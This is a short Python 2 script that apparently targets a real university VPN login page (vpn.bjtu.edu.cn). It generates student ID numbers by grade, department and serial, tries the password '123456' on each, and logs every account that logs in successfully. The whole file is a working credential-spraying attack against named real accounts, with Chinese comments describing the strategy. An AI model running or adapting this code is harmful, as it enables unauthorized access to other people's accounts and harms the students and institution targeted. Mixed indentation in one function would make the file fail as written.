#!/usr/bin/python
#-*- coding: UTF-8 -*-
import urllib
import urllib2
import cookielib

#login
def crack_it(url,username,password):
  cj = cookielib.CookieJar()
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
	opener.addheaders = [('User-agent','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)')]
	urllib2.install_opener(opener)
	req = urllib2.Request(url,urllib.urlencode({"uname":username,"pwd":password}))
	req.add_header("Referer",url)
	resp = urllib2.urlopen(req)
	return resp.read()

#logout
def logout(url):
	urllib2.urlopen(url).read()

def beginCrack(filename,url,success_flag,logout_url):
	#grade = ["09","10"]
	grade = "10" #先测试09级
	department=range(21,32) #学院?
	stu=range(1001,3099)
	logfile=open(filename,"w")
	for i in department:
		for j in stu:
			username = grade + str(i) + str(j)
			try:
				result = crack_it(url,username,'123456') #策略1 账号密码相同
				print(username)
				if result.find(success_flag) > 0:
					logfile.write(username+"\n") #记录登陆成功的学号
					print "crack success : " + username
					logfile.flush()
					logout(logout_url) #注销
			except Exception,data:
				pass #记录异常
	logfile.close()

if __name__ == "__main__":
	filename = "log.txt"
	url = "https://vpn.bjtu.edu.cn/prx/000/http/localhost/login"
	success_flag = "开始客户端服务"
	logout_url = "https://vpn.bjtu.edu.cn/prx/000/http/localhost/login"
	beginCrack(filename,url,success_flag,logout_url)
